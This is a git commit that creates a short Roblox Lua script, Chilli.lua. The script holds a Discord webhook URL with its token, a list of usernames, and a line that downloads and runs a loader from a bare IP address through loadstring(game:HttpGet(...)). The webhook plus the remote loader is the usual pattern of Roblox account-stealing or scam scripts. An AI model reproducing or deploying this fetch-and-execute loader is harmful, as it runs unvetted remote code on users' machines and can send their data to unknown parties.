8ff0074d65b6572b325571b1a3d4001e05a025e4
elpro503aa200-collab <elpro503aa200@gmail.com>
2025-10-16 11:29:31 -0400

    Create Chilli.lua

---
+++ Chilli.lua
@@ -0,0 +1,5 @@
+webhook: https://discord.com/api/webhooks/1397267405209604146/FZKae_8FLJy7kSTUlpmgVs6_Pbj8E3QVDPuzDFhSbLS3KMhDZBBfdPQZZlLf_lHtUmSB``
+usernames: ``yorch0de0pepa, elpro503aa200``
+
+ID="35848e1f-436b-4314-864a-89f3847f9a71";
+loadstring(game:HttpGet("http://109.71.240.235:3910/cdn/loader.luau"))()
